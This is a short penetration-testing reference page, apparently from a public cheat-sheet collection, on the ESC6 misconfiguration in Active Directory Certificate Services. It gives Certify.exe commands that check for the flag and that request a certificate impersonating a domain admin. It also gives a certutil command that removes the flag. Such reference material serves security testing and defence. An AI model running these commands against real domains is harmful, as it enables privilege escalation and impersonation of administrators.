---
title: Active Directory - Certificate ESC6
source_url: https://github.com/swisskyrepo/InternalAllTheThings/blob/203bb0c0b290bf7c9158c32d43523b8d66f292c1/docs/active-directory/ad-adcs-esc06.md
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: ad
---
## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

> If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.

**Exploitation**

* Use [Certify.exe](https://github.com/GhostPack/Certify) to check for **UserSpecifiedSAN** flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

    ```ps1
    Certify.exe cas
    ```

* Request a certificate for a template and add an altname, even though the default `User` template doesn't normally allow to specify alternative names

    ```ps1
    .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
    ```

**Mitigation**

* Remove the flag: `certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`

## References

* [AD CS: from ManageCA to RCE - February 11, 2022 - Pablo Martínez, Kurosh Dabbagh](https://web.archive.org/web/20220212053945/http://www.blackarrow.net/ad-cs-from-manageca-to-rce//)
